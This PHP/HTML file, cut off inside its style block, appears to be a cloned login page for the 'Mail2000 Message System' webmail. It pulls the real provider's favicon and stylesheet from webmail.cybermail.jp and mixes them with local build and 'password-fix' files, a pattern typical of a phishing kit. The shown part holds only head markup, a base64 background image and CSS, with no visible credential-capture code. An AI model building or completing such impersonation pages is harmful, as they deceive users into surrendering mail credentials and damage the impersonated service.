<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="https://webmail.cybermail.jp/favicon.ico?220127">
    <title>Mail2000 Message System</title>

    <!-- Original stylesheet -->
    <link rel="stylesheet" href="https://webmail.cybermail.jp/c80/login.css?m=2309121757">

    <!-- Password-mask fix (must load AFTER login.css) -->
    <link rel="stylesheet" href="../assets/password-fix.css?v=1">

    <style>
        html {
            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2NiIgaGVpZ2h0PSIyNTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBvcGFjaXR5PSIuNCI+PHBhdGggZD0iTTExNDQgMTUyLjQ5OWMwLTIyLjEyOC0xNy45NjEtNDAuMDYyLTQwLjExOS00MC4wNjJhMzkuOTgyIDM5Ljk4MiAwIDAwLTI0LjY1MyA4LjQ2NmMtMTEuMy0xOS41MDUtMzIuNDAyLTMyLjYzNi01Ni41OTItMzIuNjM2LTExLjE5OCAwLTIxLjczOSAyLjgxOC0zMC45NTIgNy43NzUuMDkxLTEuMzY1LjE1NC0yLjc0LjE1NC00LjEyNyAwLTM0LjAyNy0yNy42MjMtNjEuNjEtNjEuNy02MS42MS0xMy43NTIgMC0yNi40NSA0LjQ5Ny0zNi43MDggMTIuMDkyQzg4MS41NjggMTcuOSA4NTYuNDQ1IDEgODI3LjM2NyAxYy00MC41MDUgMC03My4zNCAzMi43ODgtNzMuMzQgNzMuMjM2IDAgNC40NTguNDIgOC44MTUgMS4xODQgMTMuMDU1YTQ5LjkzIDQ5LjkzIDAgMDAtMTguMDgtMy4zNzZjLTI3LjY0IDAtNTAuMDQ3IDIyLjM3NS01MC4wNDcgNDkuOTc0IDAgMy41MTguMzY5IDYuOTQ3IDEuMDU5IDEwLjI2YTQ5Ljg1IDQ5Ljg1IDAgMDAtMjIuMzA0LTUuMjRjLTE0LjgzNSAwLTI4LjE1NCA2LjQ0OS0zNy4zMiAxNi42ODYtNS45ODItMTguNjc3LTIzLjUwMy0zMi4yMDItNDQuMTkzLTMyLjIwMmE0Ni4yNTMgNDYuMjUzIDAgMDAtMTkuNDQ3IDQuMjY3Yy0xNC4xNzYtNDMuMDg1LTU0Ljc2My03NC4yMDUtMTAyLjY1NC03NC4yMDUtNTIuMzA2IDAtOTUuOTI1IDM3LjExMi0xMDUuOTA3IDg2LjQwMy0xMC4xNDQtNy41LTIyLjY5NS0xMS45MzgtMzYuMjg2LTExLjkzOC0yNC4zMDggMC00NS4yOTUgMTQuMTktNTUuMTE4IDM0LjcyNC0xMy4zNTItMTYuMjY3LTMzLjYyOC0yNi42NS01Ni4zMzUtMjYuNjUtMjguNzQ1IDAtNTMuNTg5IDE2LjYzNi02NS40MjcgNDAuNzg4YTQ5Ljg0OSA0OS44NDkgMCAwMC0yNy4xMDUtNy45NzNjLTI3LjY0IDAtNTAuMDQ3IDIyLjM3NC01MC4wNDcgNDkuOTc1VjM3NmgxMDc4VjE1My41MjVoLS4wMjZjLjAwOS0uMzQyLjAyNi0uNjgzLjAyNi0xLjAyNiIgZmlsbD0iIzk2REJGMiIvPjxnIGZpbGw9IiNBQUUyRjQiPjxwYXRoIGQ9Ik03MzguNDE1IDg5LjkwNmE0OS42OTYgNDkuNjk2IDAgMDExOC4wODcgMy4zOTkgNzcuNDMxIDc3LjQzMSAwIDAxLS43NjUtNS40OTYgNDkuNjcgNDkuNjcgMCAwMC0xNy4zMjItMy4xMmMtMjcuNjQ5IDAtNTAuMDYyIDIyLjUyNC01MC4wNjIgNTAuMzEgMCAuODczLjAyNCAxLjczOS4wNjcgMi42MDIgMS4zNTQtMjYuNTcgMjMuMjItNDcuNjk1IDQ5Ljk5NS00Ny42OTVNODI4LjY4IDYuNDM3YzI5LjA4OCAwIDU0LjIxOSAxNy4wMTIgNjYuMDg1IDQxLjY3NCAxMC4yNjItNy42NDggMjIuOTY0LTEyLjE3NSAzNi43Mi0xMi4xNzUgMzMuMDUyIDAgNjAuMDMzIDI2LjExIDYxLjY0MSA1OC45MjUuMDI2LS43MDYuMDc4LTEuNDA1LjA3OC0yLjExOCAwLTM0LjI1NS0yNy42MzItNjIuMDI1LTYxLjcyLTYyLjAyNS0xMy43NTUgMC0yNi40NTcgNC41MjctMzYuNzIgMTIuMTc1Qzg4Mi45IDE4LjIzMSA4NTcuNzY5IDEuMjIgODI4LjY4MiAxLjIyYy00MC41MTggMC03My4zNjQgMzMuMDA5LTczLjM2NCA3My43MjcgMCAuOTEuMDMgMS44MTIuMDYyIDIuNzEzIDEuMzE3LTM5LjU1NiAzMy42Mi03MS4yMjIgNzMuMzAyLTcxLjIyMk0xMTcuMTMzIDE3NS4zN2E0OS42MzYgNDkuNjM2IDAgMDEyNy4xMTUgOC4wMjdjMTEuODQxLTI0LjMxNCAzNi42OTQtNDEuMDY0IDY1LjQ0Ny00MS4wNjQgMjIuNzE0IDAgNDIuOTk3IDEwLjQ1NSA1Ni4zNTQgMjYuODMgOS44MjUtMjAuNjczIDMwLjgyLTM0Ljk1NiA1NS4xMzUtMzQuOTU2IDEzLjU5NSAwIDI2LjE1IDQuNDY4IDM2LjI5OCAxMi4wMTggOS45ODUtNDkuNjIzIDUzLjYxOS04Ni45ODQgMTA1Ljk0LTg2Ljk4NCA0Ny45MDYgMCA4OC41MDYgMzEuMzMgMTAyLjY4NyA3NC43MDVhNDYuMDIzIDQ2LjAyMyAwIDAxMTkuNDU0LTQuMjk4YzIwLjY5NiAwIDM4LjIyMiAxMy42MTcgNDQuMjA3IDMyLjQyMSA5LjE2OC0xMC4zMDcgMjIuNDkzLTE2LjggMzcuMzMtMTYuOCA4LjAyMSAwIDE1LjU5NSAxLjkwNCAyMi4zMTIgNS4yNzNhNTAuOTUyIDUwLjk1MiAwIDAxLS44MjktNS42MDUgNDkuNjEyIDQ5LjYxMiAwIDAwLTIxLjQ4Mi00Ljg4NmMtMTQuODM4IDAtMjguMTYzIDYuNDkzLTM3LjMzMSAxNi44LTUuOTg1LTE4LjgwNC0yMy41MS0zMi40MjEtNDQuMjA3LTMyLjQyMWE0Ni4wMjMgNDYuMDIzIDAgMDAtMTkuNDU0IDQuMjk4Yy0xNC4xOC00My4zNzQtNTQuNzgtNzQuNzA1LTEwMi42ODctNzQuNzA1LTUyLjMyMSAwLTk1Ljk1NSAzNy4zNjEtMTA1Ljk0IDg2Ljk4NC0xMC4xNDgtNy41NS0yMi43MDMtMTIuMDE4LTM2LjI5OC0xMi4wMTgtMjQuMzE2IDAtNDUuMzEgMTQuMjgzLTU1LjEzNSAzNC45NTctMTMuMzU3LTE2LjM3Ni0zMy42NC0yNi44MzEtNTYuMzU0LTI2LjgzMS0yOC43NTMgMC01My42MDYgMTYuNzUtNjUuNDQ3IDQxLjA2NGE0OS42MzYgNDkuNjM2IDAgMDAtMjcuMTE1LTguMDI3Yy0yNy42NDkgMC01MC4wNjIgMjIuNTI0LTUwLjA2MiA1MC4zMXY1LjIxOGMwLTI3Ljc4NiAyMi40MTMtNTAuMzEgNTAuMDYyLTUwLjMxTTExNDUuNDE1IDE1OS45ODR2LTEuMDM1YzAgLjM0OC0uMDE4LjY5LS4wMjYgMS4wMzVoLjAyNnoiLz48cGF0aCBkPSJNMTE0NS40MTUgMTUzLjczMmMwLTIyLjI3NC0xNy45NjctNDAuMzMtNDAuMTMyLTQwLjMzLTkuMyAwLTE3Ljg1NiAzLjE4OC0yNC42NjEgOC41MjItMTEuMzA0LTE5LjYzMy0zMi40MTItMzIuODU0LTU2LjYxLTMyLjg1NGE2NC44MTMgNjQuODEzIDAgMDAtMzAuODM3IDcuNzY1Yy4wMDcuMzc1LjAyOS43NDcuMDI5IDEuMTI3IDAgMS4zOTYtLjA2MiAyLjc4LS4xNTQgNC4xNTNhNjQuODMgNjQuODMgMCAwMTMwLjk2Mi03LjgyN2MyNC4xOTggMCA0NS4zMDYgMTMuMjIgNTYuNjEgMzIuODU0IDYuODA1LTUuMzM0IDE1LjM2LTguNTIyIDI0LjY2MS04LjUyMiAyMi4xNjUgMCA0MC4xMzIgMTguMDU2IDQwLjEzMiA0MC4zM3YtNC4xODNoLS4wMjZjLjAwOC0uMzQ2LjAyNi0uNjg3LjAyNi0xLjAzNSIvPjwvZz48cGF0aCBkPSJNNDg0LjUxIDI4OC43MzRsLS42MjUtLjI3Yy4zMjQtLjE2OC42NDctLjMzNi45NjItLjUxNC0uMTEzLjI2MS0uMjI5LjUyMi0uMzM4Ljc4NG04MjkuOTU1LTE5Mi44OThjLTkuNzY2IDAtMTguOTUzIDIuNDgtMjYuOTcgNi44NDEtNy41NDItMzguMTQzLTQwLjktNjcuMTM4LTgxLjMxMi02Ny42Ny00MS40MzQtLjU0NS03Ni4yMzMgMjkuMDIyLTgzLjY0NyA2OC40MTNhNDQuMDM3IDQ0LjAzNyAwIDAwLTIzLjkyLTcuMDI4Yy0yNC40NTMgMC00NC4yNzggMTkuODM2LTQ0LjI3OCA0NC4zMDYgMCAxLjQyNC4wNzMgMi44My4yMDQgNC4yMi01LjQwNy00LjA2NS0xMi4xMDUtNi41MDItMTkuMzktNi41MDItNy4zNCAwLTE0LjA4OCAyLjQ3NC0xOS41MTcgNi41OTgtNS43MTgtMTkuNDk3LTIzLjcyLTMzLjczOC00NS4wNTUtMzMuNzM4LTE1LjIxOCAwLTI4LjczOCA3LjI1LTM3LjMyIDE4LjQ3Ny0xMi41MDgtMTQuODg3LTMxLjI0OS0yNC4zNTYtNTIuMjA3LTI0LjM1Ni0zNy42NiAwLTY4LjE4NyAzMC41NDYtNjguMTg3IDY4LjIzIDAgMi43MzMuMTc4IDUuNDIzLjQ5IDguMDc2LTEwLjkwMi01LjE3NS0yMy4wODktOC4wNzctMzUuOTU1LTguMDc3LTMxLjEwMiAwLTU4LjIzNiAxNi45MjEtNzIuNzY0IDQyLjA1Mi0xMS45My0yMC40OTQtMzQuMTEtMzQuMjgyLTU5LjUxOS0zNC4yODItMzguMDIyIDAtNjguODQ3IDMwLjg0Mi02OC44NDcgNjguODg3IDAgNC4yNTQuNDA2IDguNDEzIDEuMTQ0IDEyLjQ1NS0xMC4xNTMtNy40MjYtMjIuNjYyLTExLjgyLTM2LjItMTEuODItMTYuMTc1IDAtMzAuODc2IDYuMjYzLTQxLjg0NCAxNi40ODYuMjg3LTEuNjUyLjQ2NS0zLjM0Mi40NjUtNS4wNzggMC0xNi4yNDQtMTMuMTYtMjkuNDE0LTI5LjM5Ni0yOS40MTQtOC4xMDIgMC0xNS40NCAzLjI4NC0yMC43NTggOC41OS0yLjU5NS0yNS4xOTgtMjMuODc2LTQ0Ljg1My00OS43NDYtNDQuODUzLTkuMDY5IDAtMTcuNTY2IDIuNDMtMjQuOSA2LjY1MS0xMi4zNzYtMTguMzAxLTMzLjMxNS0zMC4zMzMtNTcuMDYtMzAuMzMzYTY4LjQ4MiA2OC40ODIgMCAwMC0zMi4wNCA3LjkxN2MuMDM4LS43Ni4wNTctMS41MjQuMDU3LTIuMjkyIDAtMjUuNjI0LTIwLjc1OC00Ni4zOTYtNDYuMzY3LTQ2LjM5NmE0Ni4xMzUgNDYuMTM1IDAgMDAtMjMuNzI0IDYuNTMxYy0xLjAxMy0xNS4zMjQtMTMuNzIyLTI3LjQ1LTI5LjI5Ny0yNy40NS00Ljk5MiAwLTkuNjkgMS4yNTQtMTMuODA3IDMuNDUxLTEzLjU4OS0yNS45OS00MC43NzgtNDMuNzM4LTcyLjEyMi00My43MzgtMzQuODMyIDAtNjQuNTM1IDIxLjkwNS03Ni4xNDMgNTIuNjkyYTQ2LjE1IDQ2LjE1IDAgMDAtMjAuMTY1LTQuNjA4Yy0yNS42MDcgMC00Ni4zNjcgMjAuNzctNDYuMzY3IDQ2LjM5NFY1OTloMTQxM1YxNTIuNDA0YzAtMzEuMjQyLTI1LjMxMy01Ni41NjgtNTYuNTM2LTU2LjU2OCIgZmlsbD0iI0FBRTJGNCIvPjxnIGZpbGw9IiNDMUU5RjciPjxwYXRoIGQ9Ik02NDUuMTEyIDE4Ni40ODJjMjUuNDEgMCA0Ny41ODkgMTMuNzQzIDU5LjUxOCAzNC4xNzIgMTQuNTI4LTI1LjA1IDQxLjY2NC00MS45MTggNzIuNzY0LTQxLjkxOCAxMi44NjYgMCAyNS4wNTMgMi44OTQgMzUuOTU1IDguMDUxYTcwLjA4MiA3MC4wODIgMCAwMS0uNDA2LTUuMzU1IDgzLjg2IDgzLjg2IDAgMDAtMzUuNTUtNy44N2MtMzEuMSAwLTU4LjIzNSAxNi44NjgtNzIuNzYzIDQxLjkxOC0xMS45MjktMjAuNDI4LTM0LjEwOC0zNC4xNzItNTkuNTE4LTM0LjE3Mi0zOC4wMjIgMC02OC44NDUgMzAuNzQzLTY4Ljg0NSA2OC42NjYgMCAuODk3LjAyNiAxLjc4OS4wNjIgMi42NzUgMS4zMjEtMzYuNzY0IDMxLjYtNjYuMTY3IDY4Ljc4My02Ni4xNjdNODgxLjA0NSAxMTAuNzI1YzIwLjk1OSAwIDM5LjY5OSA5LjQzOSA1Mi4yMDcgMjQuMjggOC41ODItMTEuMTk0IDIyLjEwMi0xOC40MiAzNy4zMTktMTguNDIgMjEuMzM1IDAgMzkuMzM1IDE0LjE5NiA0NS4wNTUgMzMuNjMgNS40My00LjExIDEyLjE3Ny02LjU3NyAxOS41MTctNi41NzcgNy4yODUgMCAxMy45ODMgMi40MyAxOS4zOSA2LjQ4M2E0NC41NjIgNDQuNTYyIDAgMDEtLjIwNC00LjIwOGMwLS4zNjYuMDItLjcyNi4wMjYtMS4wOS01LjM3Ni0zLjk3NC0xMi4wMDUtNi4zNi0xOS4yMTItNi4zNi03LjM0IDAtMTQuMDg3IDIuNDY5LTE5LjUxNyA2LjU3OS01LjcyLTE5LjQzNS0yMy43Mi0zMy42My00NS4wNTUtMzMuNjMtMTUuMjE3IDAtMjguNzM3IDcuMjI2LTM3LjMxOSAxOC40MTgtMTIuNTA4LTE0Ljg0LTMxLjI0OC0yNC4yNzktNTIuMjA3LTI0LjI3OS0zNy42NTkgMC02OC4xODggMzAuNDQ4LTY4LjE4OCA2OC4wMTEgMCAuNzcxLjA0NSAxLjUzMy4wNzIgMi4yOTkgMS41MTItMzYuMjI2IDMxLjQyMi02NS4xMzYgNjguMTE2LTY1LjEzNk0xMzE0LjQ1NSA5Ni4wMjFjLTkuNzY2IDAtMTguOTU1IDIuNDcxLTI2Ljk3MSA2LjgyLTcuNTQtMzguMDIyLTQwLjktNjYuOTI1LTgxLjMxLTY3LjQ1NS00MS40MzQtLjU0My03Ni4yMzMgMjguOTI3LTgzLjY0NyA2OC4xOTRhNDQuMTM4IDQ0LjEzOCAwIDAwLTIzLjkyLTcuMDA1Yy0yNC40NTQgMC00NC4yNzcgMTkuNzczLTQ0LjI3NyA0NC4xNjQgMCAuODU2LjAzMyAxLjcwNC4wODMgMi41NDcgMS4zNjMtMjMuMTY3IDIwLjYyNS00MS41MzggNDQuMTk1LTQxLjUzOCA4LjgxNSAwIDE3LjAyIDIuNTc5IDIzLjkxOSA3LjAwNiA3LjQxNC0zOS4yNjcgNDIuMjEzLTY4LjczNyA4My42NDYtNjguMTk0IDQwLjQxLjUzIDczLjc3IDI5LjQzMyA4MS4zMSA2Ny40NTQgOC4wMTctNC4zNDggMTcuMjA2LTYuODIgMjYuOTcyLTYuODIgMzEuMjIzIDAgNTYuNTM0IDI1LjI0NiA1Ni41MzQgNTYuMzg2di01LjE3NGMwLTMxLjE0LTI1LjMxMS01Ni4zODUtNTYuNTM0LTU2LjM4NU00LjM2NyAxMjQuMzU4YzcuMjI4IDAgMTQuMDY5IDEuNjUgMjAuMTY1IDQuNTkzIDExLjYwOC0zMC42ODkgNDEuMzExLTUyLjUyNCA3Ni4xNC01Mi41MjQgMzEuMzQ2IDAgNTguNTM1IDE3LjY5MyA3Mi4xMjMgNDMuNTk4YTI5LjMyMiAyOS4zMjIgMCAwMTEzLjgwOS0zLjQzOGMxNS41NzIgMCAyOC4yODMgMTIuMDg2IDI5LjI5NiAyNy4zNjNhNDYuMjMgNDYuMjMgMCAwMTIzLjcyNC02LjUxM2MyNS42MDYgMCA0Ni4zNjYgMjAuNzA2IDQ2LjM2NiA0Ni4yNDcgMCAuNzY3LS4wMiAxLjUzLS4wNTcgMi4yODZhNjguNjc3IDY4LjY3NyAwIDAxMzIuMDQtNy44OTFjMjMuNzQ1IDAgNDQuNjgzIDExLjk5NCA1Ny4wNTkgMzAuMjM4YTQ5Ljg0IDQ5Ljg0IDAgMDEyNC45LTYuNjNjMjUuODcgMCA0Ny4xNSAxOS41OSA0OS43NDYgNDQuNzFhMjkuMzM4IDI5LjMzOCAwIDAxMjAuNzU4LTguNTYzYzE1LjM2NCAwIDI3Ljk1NSAxMS43NTggMjkuMjY2IDI2Ljc0Mi4wODMtLjg1NC4xMy0xLjcxOC4xMy0yLjU5NiAwLTE2LjE5NC0xMy4xNi0yOS4zMi0yOS4zOTYtMjkuMzJhMjkuMzM4IDI5LjMzOCAwIDAwLTIwLjc1OCA4LjU2M2MtMi41OTUtMjUuMTItMjMuODc2LTQ0LjcxLTQ5Ljc0NS00NC43MWE0OS44NCA0OS44NCAwIDAwLTI0LjkwMSA2LjYzYy0xMi4zNzYtMTguMjQ0LTMzLjMxNC0zMC4yMzgtNTcuMDYtMzAuMjM4YTY4LjY3NyA2OC42NzcgMCAwMC0zMi4wMzkgNy44OTJjLjAzNy0uNzU4LjA1Ny0xLjUyLjA1Ny0yLjI4NyAwLTI1LjU0LTIwLjc2LTQ2LjI0Ni00Ni4zNjYtNDYuMjQ2YTQ2LjIzIDQ2LjIzIDAgMDAtMjMuNzI0IDYuNTEyYy0xLjAxMy0xNS4yNzctMTMuNzI0LTI3LjM2My0yOS4yOTYtMjcuMzYzLTQuOTkyIDAtOS42OSAxLjI0OC0xMy44MSAzLjQzOS0xMy41ODctMjUuOTA2LTQwLjc3Ni00My42LTcyLjEyMS00My42LTM0LjgzIDAtNjQuNTMzIDIxLjgzNi03Ni4xNCA1Mi41MjVhNDYuMjcyIDQ2LjI3MiAwIDAwLTIwLjE2Ni00LjU5M2MtMjUuNjA4IDAtNDYuMzY2IDIwLjcwNi00Ni4zNjYgNDYuMjQ2djUuMTc0YzAtMjUuNTQgMjAuNzU4LTQ2LjI0NiA0Ni4zNjYtNDYuMjQ2TTQ5OS44MzIgMjY3LjE1NGMwIDEuNzMtLjE4IDMuNDEzLS40NjcgNS4wNjIgMTAuOTY4LTEwLjE5MyAyNS42Ny0xNi40MzYgNDEuODQ1LTE2LjQzNmE2MS4yMiA2MS4yMiAwIDAxMzYuMTk5IDExLjc4MyA3MS44NiA3MS44NiAwIDAxLS44MDItNS43MzZjLTEwLjAwOS03LjA1Ny0yMi4yMS0xMS4yMi0zNS4zOTctMTEuMjItMTUuOTYyIDAtMzAuNDgzIDYuMDg5LTQxLjQwNCAxNi4wNDIuMDAzLjE3LjAyNi4zMzQuMDI2LjUwNSIvPjwvZz48Zz48cGF0aCBkPSJNMTMzNCAyOTkuMTY2YzAtMjguNDktMjMuMTQ4LTUxLjU4Ni01MS43MDEtNTEuNTg2LTEyLjA4MiAwLTIzLjE4OCA0LjE0Ni0zMS45OSAxMS4wNzYtMS45MjQtMTguNDk2LTE3LjU5LTMyLjkxOS0zNi42MzctMzIuOTE5LTUuNjg4IDAtMTEuMDU1IDEuMzI1LTE1Ljg2NCAzLjYyMi05LjA2Mi0yOS43NDUtMzYuNzYtNTEuMzk2LTY5LjUzMi01MS4zOTYtMzUuNTQ3IDAtNjUuMTE0IDI1LjQ3MS03MS40MTcgNTkuMTE1YTUxLjUzIDUxLjUzIDAgMDAtMzEuNDktMTAuNjg1Yy0yOC41NTMgMC01MS43IDIzLjA5OC01MS43IDUxLjU4OCAwIDguMDQ3IDEuODUgMTUuNjYyIDUuMTQzIDIyLjQ0OWE0MC45MDkgNDAuOTA5IDAgMDAtMjMuMjAyLTcuMTc3Yy0xMS41ODUgMC0yMi4wNCA0Ljc5OC0yOS41MDEgMTIuNS00LjY0Ni0zOS43MDgtMzguNDUyLTcwLjUyNi03OS40OTItNzAuNTI2LTM5LjUyOCAwLTcyLjM0MyAyOC41OTMtNzguODU4IDY2LjE3Ni04LjM5LTguMzM4LTE5Ljk2My0xMy40OTUtMzIuNzQtMTMuNDk1YTQ2LjI0IDQ2LjI0IDAgMDAtMjcuNDYyIDguOTg0Yy04LjI2NC0zNS4zMzUtNDAuMDEtNjEuNjY1LTc3Ljk0LTYxLjY2NWE3OS44NTQgNzkuODU0IDAgMDAtMzMuMDA1IDcuMTEgNjEuNjggNjEuNjggMCAwMC4yNTMtNS40MmMwLTMzLjY0My0yNy4zMzQtNjAuOTE3LTYxLjA1LTYwLjkxNy0yNi4zOSAwLTQ4Ljg2NiAxNi43MS01Ny4zOSA0MC4xMDQtMTAuNjUzLTkuMDUtMjQuNDU1LTE0LjUyNC0zOS41NDQtMTQuNTI0LTI5LjU2MiAwLTU0LjIxNSAyMC45NjktNTkuODQgNDguODE1LTguMzktOC4zMjgtMTkuOTUyLTEzLjQ3OC0zMi43MjMtMTMuNDc4LTE1LjQ3MSAwLTI5LjE2NCA3LjU2Mi0zNy41OTMgMTkuMTc5LTUuOTM4LTExLjIwMy0xNy43Mi0xOC44NDQtMzEuMzA2LTE4Ljg0NC03Ljg2MiAwLTE1LjEgMi41ODgtMjAuOTc3IDYuOTE1LTMuMTY1LTMwLjY3OC0yOS4xNDMtNTQuNjA0LTYwLjcyNC01NC42MDQtMjMuODE4IDAtNDQuNDM1IDEzLjYxNy01NC40OTggMzMuNDctOS4wNC0xMi45NjMtMjQuMDcyLTIxLjQ1My00MS4wOTUtMjEuNDUzLTI3LjY0MiAwLTUwLjA0OCAyMi4zNTctNTAuMDQ4IDQ5LjkzNCAwIDEuMzY2LjA3MSAyLjcxNi4xNzkgNC4wNTItNi43Mi02LjE4Ny0xNS42OTMtOS45Ny0yNS41NTctOS45N0MzLjg3OCAyNDUuNTk2LTEzIDI2Mi40MzctMTMgMjgzLjIxMVY2NDJoMTM0MC4yN1YzMjQuNjA0YTUxLjI0NCA1MS4yNDQgMCAwMDYuNzMtMjUuNDM4IiBmaWxsPSIjQzFFOUY3Ii8+PGcgZmlsbD0iI0Q1RjBGOSI+PHBhdGggZD0iTTEwMjQuOTY1IDIzMC44NGMxMS44NDggMCAyMi43NTQgNC4wMSAzMS40NyAxMC43MzMgNi4zLTMzLjc5NiAzNS44NS01OS4zODIgNzEuMzc0LTU5LjM4MiAzMi43NTIgMCA2MC40MzQgMjEuNzQ5IDY5LjQ5MSA1MS42MjggNC44MDUtMi4zMDYgMTAuMTctMy42MzggMTUuODU1LTMuNjM4IDE5LjAzNCAwIDM0LjY5IDE0LjQ5IDM2LjYxNCAzMy4wNjcgOC43OTYtNi45NiAxOS44OTYtMTEuMTI4IDMxLjk3LTExLjEyOCAyNy41OTQgMCA1MC4xMzMgMjEuNjk2IDUxLjU5IDQ5LjAwNi4wMzctLjc5NC4wOC0xLjU4NS4wOC0yLjM4OCAwLTI4LjYxOS0yMy4xMzQtNTEuODItNTEuNjctNTEuODItMTIuMDc0IDAtMjMuMTc0IDQuMTY3LTMxLjk3IDExLjEyOC0xLjkyNC0xOC41NzgtMTcuNTgtMzMuMDY3LTM2LjYxNC0zMy4wNjctNS42ODYgMC0xMS4wNSAxLjMzMS0xNS44NTUgMy42MzgtOS4wNTctMjkuODgtMzYuNzM5LTUxLjYyOC02OS40OS01MS42MjgtMzUuNTI2IDAtNjUuMDc1IDI1LjU4Ni03MS4zNzQgNTkuMzgxLTguNzE3LTYuNzIzLTE5LjYyMy0xMC43MzItMzEuNDctMTAuNzMyLTI4LjUzNyAwLTUxLjY3IDIzLjIwMS01MS42NyA1MS44MiAwIC44MzQuMDM0IDEuNjYyLjA3MiAyLjQ4NyAxLjQxLTI3LjM1NyAyMy45Ny00OS4xMDUgNTEuNTk3LTQ5LjEwNU0yNC45IDI1MC4xM2M5Ljg1NyAwIDE4LjgyNiAzLjc5OSAyNS41NCAxMC4wMTRhNTEuMDE3IDUxLjAxNyAwIDAxLS4xNzgtNC4wNjhjMC0uNDIuMDIzLS44MzguMDMzLTEuMjU3LTYuNjk4LTYuMTM4LTE1LjYwNy05Ljg5Mi0yNS4zOTYtOS44OTItMjAuODA4IDAtMzcuNjc2IDE2LjkxNy0zNy42NzYgMzcuNzg0djUuMjAzYzAtMjAuODY4IDE2Ljg2OC0zNy43ODUgMzcuNjc2LTM3Ljc4NU01OTYuNDY2IDI0Ni44NTRhNzkuNDg5IDc5LjQ4OSAwIDAxMzIuOTg1LTcuMTRjMzcuOTA4IDAgNjkuNjM2IDI2LjQ0OSA3Ny44OTMgNjEuOTQ0YTQ2LjA2MSA0Ni4wNjEgMCAwMTI3LjQ0NS05LjAyOGMxMi43NzEgMCAyNC4zMzYgNS4xODEgMzIuNzIyIDEzLjU1OSA2LjUxMi0zNy43NTMgMzkuMzA1LTY2LjQ3NCA3OC44MS02Ni40NzQgNDEuMDE2IDAgNzQuODAyIDMwLjk1NiA3OS40NDMgNzAuODQyIDcuNDU4LTcuNzM3IDE3LjkwNy0xMi41NTUgMjkuNDgzLTEyLjU1NWE0MC43MyA0MC43MyAwIDAxMjMuMTg4IDcuMjA5IDUxLjczNyA1MS43MzcgMCAwMS0yLjcyMy02LjkxNiA0MC42OTEgNDAuNjkxIDAgMDAtMjAuNDY1LTUuNDk2Yy0xMS41NzYgMC0yMi4wMjUgNC44MTgtMjkuNDgzIDEyLjU1Ni00LjY0MS0zOS44ODYtMzguNDI3LTcwLjg0My03OS40NDQtNzAuODQzLTM5LjUwNCAwLTcyLjI5NyAyOC43MjEtNzguODA5IDY2LjQ3NS04LjM4Ni04LjM3OC0xOS45NS0xMy41Ni0zMi43MjItMTMuNTZhNDYuMDYxIDQ2LjA2MSAwIDAwLTI3LjQ0NSA5LjAyOGMtOC4yNTctMzUuNDk1LTM5Ljk4NS02MS45NDMtNzcuODkzLTYxLjk0M2E3OS40NjcgNzkuNDY3IDAgMDAtMzIuNzM0IDcuMDM0IDYyLjYwOSA2Mi42MDkgMCAwMS0uMjUgNS4zMDhNMTAwLjI4IDIwNS45MTVjMTcuMDE0IDAgMzIuMDM1IDguNTI4IDQxLjA3MSAyMS41NSAxMC4wNTUtMTkuOTQgMzAuNjYtMzMuNjIyIDU0LjQ2NS0zMy42MjIgMzEuNTYyIDAgNTcuNTI1IDI0LjAzNCA2MC42ODcgNTQuODUgNS44NzMtNC4zNDUgMTMuMTA3LTYuOTQ3IDIwLjk2NC02Ljk0NyAxMy41NzYgMCAyNS4zNTMgNy42NzggMzEuMjg2IDE4LjkzIDguNDI2LTExLjY2NyAyMi4xMS0xOS4yNjMgMzcuNTcyLTE5LjI2MyAxMi43NjMgMCAyNC4zMTcgNS4xNzIgMzIuNzAyIDEzLjUzNyA1LjYyMS0yNy45NzIgMzAuMjYtNDkuMDM1IDU5LjgwNi00OS4wMzUgMTUuMDggMCAyOC44NzEgNS40OTcgMzkuNTE3IDE0LjU4OCA4LjUyLTIzLjQ5OCAzMC45ODEtNDAuMjgyIDU3LjM1Ni00MC4yODIgMzIuODM4IDAgNTkuNjAzIDI2LjAxOCA2MC45NDkgNTguNjE5YTU1LjIzIDU1LjIzIDAgMDAuMDY1LTIuNjNjMC0zMy43OTctMjcuMzE3LTYxLjE5MS02MS4wMTQtNjEuMTkxLTI2LjM3NSAwLTQ4LjgzNiAxNi43ODMtNTcuMzU2IDQwLjI4MS0xMC42NDYtOS4wOS0yNC40MzgtMTQuNTg4LTM5LjUxNy0xNC41ODgtMjkuNTQ2IDAtNTQuMTg1IDIxLjA2NC01OS44MDYgNDkuMDM2LTguMzg1LTguMzY2LTE5LjkzOS0xMy41MzctMzIuNzAyLTEzLjUzNy0xNS40NjIgMC0yOS4xNDYgNy41OTYtMzcuNTcyIDE5LjI2My01LjkzMy0xMS4yNTMtMTcuNzEtMTguOTMtMzEuMjg2LTE4LjkzLTcuODU3IDAtMTUuMDkxIDIuNjAxLTIwLjk2NCA2Ljk0Ny0zLjE2Mi0zMC44MTYtMjkuMTI1LTU0Ljg1LTYwLjY4Ny01NC44NS0yMy44MDUgMC00NC40MSAxMy42OC01NC40NjUgMzMuNjIyLTkuMDM2LTEzLjAyMi0yNC4wNTctMjEuNTUtNDEuMDcyLTIxLjU1LTI3LjYyNSAwLTUwLjAxNyAyMi40NTctNTAuMDE3IDUwLjE2IDAgLjgzMS4wMzMgMS42NTYuMDc2IDIuNDc4IDEuNDE0LTI2LjQzNyAyMy4yMzEtNDcuNDM2IDQ5Ljk0MS00Ny40MzYiLz48L2c+PC9nPjwvZz48L3N2Zz4=');
        }

        .error-message {
            margin: 24px 0;
            font-size: 1rem;
            color: #f44336;
        }

        :lang(ja) {
            font-family: "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Hiragino Kaku Gothic Pro", osaka, meiryo, "Helvetica Neue", helvetica, arial, sans-serif;
        }

        div { display: block; unicode-bidi: isolate; }

        body {
            margin: 0;
            display: flex;
            cursor: default;
            user-select: none;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
            padding: 0 calc((1266px + 100px - 1026px) / 2);
            position: relative;
            font-size: 1rem;
        }

        .loading {
            opacity: 0.6;
            pointer-events: none;
        }

        /* ==================================================
           Force password input to match the email input.
           MaskedPassword wraps the input in a <span> at
